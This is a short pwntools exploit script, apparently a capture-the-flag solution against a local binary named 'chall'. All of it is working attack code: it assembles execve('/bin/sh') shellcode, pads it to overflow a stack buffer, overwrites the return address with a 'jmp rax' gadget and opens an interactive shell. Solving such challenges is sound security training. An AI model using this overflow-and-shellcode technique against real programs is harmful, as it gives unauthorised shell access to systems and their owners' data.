from pwn import *
context(arch='amd64',os="linux")
context.log_level = 'debug'

sh=process("./chall")

shellcode=asm('''
mov rdi, 0x68732f6e69622f
push rdi
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,0x3b
syscall
''')

jmp_rax=0x0000000000400485 #: jmp rax
payload=shellcode.ljust(0x38,'\x00')+p64(jmp_rax)

sh.sendline(payload)

sh.interactive()
